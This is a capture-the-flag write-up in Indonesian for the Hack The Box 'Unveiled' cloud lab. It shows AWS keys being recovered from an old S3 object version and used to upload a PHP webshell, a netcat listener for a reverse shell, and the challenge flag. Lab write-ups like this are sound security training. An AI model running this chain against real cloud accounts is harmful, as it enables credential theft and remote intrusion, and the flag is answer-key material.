#cloud #easy #s3 #aws #rce


# Steps
1. Buat persiapan dengan memasukkan informasi hostname pada `/etc/hosts`
```sh
sudo nano /etc/hosts

# masukkan entry berikut ini
<IP_address> unveiled.htb
``` 


2. Di dalam page source web, terdapat dua informasi penting. Yang pertama adalah username `galen` dan source yang mengarah kepada link  s3 bucket.
```html
<!-- Last updated Tue 20 Jun 2023 02:39:53 PM by galen-->

<script src="http://s3.unveiled.htb/unveiled-backups/main.js"/>
```


3.  Melihat informasi tersebut, kita bisa mendaftarkan IAM user pada AWS dan mendapatkan `aws_access_id` dan `aws_access_key`. Kemudian masukkan kedua informasi tersebut pada dengan perintah `aws configure --profile test
   

4. Untuk mempercepat proses pengerjaan, gunakan script berikut ini melalui bash terminal.
```shell
export AWS_ENDPOINT_URL=http://s3.unveiled.htb
function aws() {
	export AWS_DEFAULT_OUTPUT=yaml 
	if [ -z "$AWS_ENDPOINT_URL" ]
	then
		command aws "$@"
	else
		command aws "$@" --endpoint-url "$AWS_ENDPOINT_URL"
	fi
}
```

5. Listing terhadap aws s3 bucket dengan menggunakan `s3api`. Terdapat dua bucket pada endpoint url tersebut, yaitu `unveiled-backups` dan `website-assets`.  Pada bucket `unveiled-backups` ini terdapat dua file, yaitu `index.html` dan `main.tf`.  
```sh
$ aws s3api list-buckets --profile test 
Buckets:
- CreationDate: '2023-07-17T10:19:00+00:00'
  Name: unveiled-backups
- CreationDate: '2023-07-17T10:19:01+00:00'
  Name: website-assets
Owner:
  DisplayName: webfile
  ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a


$ aws s3api list-objects-v2 --bucket 'unveiled-backups' --profile test
Contents:
- ETag: '"3460d1a10fd1e53c6dbc1f8acd4c3a1b"'
  Key: index.html
  LastModified: '2023-07-17T10:19:04+00:00'
  Size: 4495
  StorageClass: STANDARD
- ETag: '"9c9e9d85b28ce6bbbba93e0860389c65"'
  Key: main.tf
  LastModified: '2023-07-17T10:19:05+00:00'
  Size: 1107
  StorageClass: STANDARD

```


6. `main.tf` adalah sebuah file Terraform yang kemungkinan berisi `aws_access_id` dan `aws_key` . Namun sayangnya kedua parameter tersebut tidak ditemukan pada `main.tf`. Kemungkinan terdapat versi file lama yang berisikan value sensitif tersebut.
```shell
$ aws s3 sync s3://unveiled-backups/ .
download: s3://unveiled-backups/main.tf to ./main.tf
download: s3://unveiled-backups/index.html to ./index.html
```


7. Pada bucket `unveiled-backups` terdapat ACL dengan permission `FULL_CONTROL` yang diberikan kepada user `webfile`.
```sh
$ aws s3api get-bucket-acl --bucket unveiled-backups --profile test
Grants:
- Grantee:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
    Type: CanonicalUser
  Permission: FULL_CONTROL
Owner:
  DisplayName: webfile
  ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a

```


7. Melihat version pada bucket `unveiled-backups` untuk mencari informasi sensitif pada file `main.tf`. Kita dapatkan VersionId dengan nilai `bf4e51a6-5bf0-4622-a833-b0948bbc2acd`.
```sh
$ aws s3api list-object-versions --bucket unveiled-backups --profile test
Versions:
...
- ETag: '"4947c773e44f5973a9c3d37f24cb8e63"'
  IsLatest: false
  Key: main.tf
  LastModified: '2023-07-17T10:19:03+00:00'
  Owner:
    DisplayName: webfile
    ID: 75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a
  Size: 1167
  StorageClass: STANDARD
  VersionId: bf4e51a6-5bf0-4622-a833-b0948bbc2acd
```


8. Mengunduh file `main.tf` pada versi `bf4e51a6-5bf0-4622-a833-b0948bbc2acd` dengan dama `main.tf.old`. Kemudian membaca file tersebut. Kita akan mendapatkan `aws_access_key` dan `aws_secret_key` yang dapat kita gunakan pada aws cli.
```shell
$ aws s3api get-object --bucket unveiled-backups --key main.tf --version-id bf4e51a6-5bf0-4622-a833-b0948bbc2acd main.tf.old --profile test
AcceptRanges: bytes
ContentLength: 1167
ContentType: binary/octet-stream
ETag: '"4947c773e44f5973a9c3d37f24cb8e63"'
LastModified: '2023-07-17T10:19:03+00:00'
Metadata: {}
VersionId: bf4e51a6-5bf0-4622-a833-b0948bbc2acd


$ cat main.tf.old                    
variable "aws_access_key"{
  default = "AKIA6CFMOGFLAHOPQTMA"
}
variable "aws_secret_key"{
  default = "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"
}
...

```


8. Menggunakan nilai `aws_access_key` dan `aws_secret_key` dan membuat satu profile baru bernama `unveilied`. Profile ini kemudian akan digunakan sebagai konfigurasi yang dipakai untuk mengakses bucket `website-assets` 
```shell
$ aws configure --profile unveiled
AWS Access Key ID [None]: AKIA6CFMOGFLAHOPQTMA
AWS Secret Access Key [None]: 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
Default region name [None]: ap-southeast-3
Default output format [None]:


$ aws sts get-caller-identity --profile unveiled
Account: '683633011377'
Arn: arn:aws:iam::683633011377:user/will
UserId: AKIAIOSFODNN7DXV3G29

```


9. Melakukan listing directory pada bucket `website-assets` dengan menggunakan profile `unveiled`.
```
$ aws s3 ls s3://website-assets --profile unveiled
2023-07-17 17:19:02      91790 background.jpg
2023-07-17 17:19:02       4372 index.html

```


10. Profile `unveiled` ini dapat digunakan untuk mengunggah webshell menuju bucket `web-assets` tersebut.
```
$ aws s3 cp shell.php s3://website-assets --profile unveiled
upload: ./shell.php to s3://website-assets/shell.php 

$ nc -lnvp 4444

$ curl http://<ip_address>/shell.php
```


11. Flag ada pada lokasi `$ cat /var/www/flag.txt:` `HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}`



# Referensi
- Writeups: [https://github.com/godylockz/Writeups/blob/main/Cloud-Unveiled.md](https://github.com/godylockz/Writeups/blob/main/Cloud-Unveiled.md)
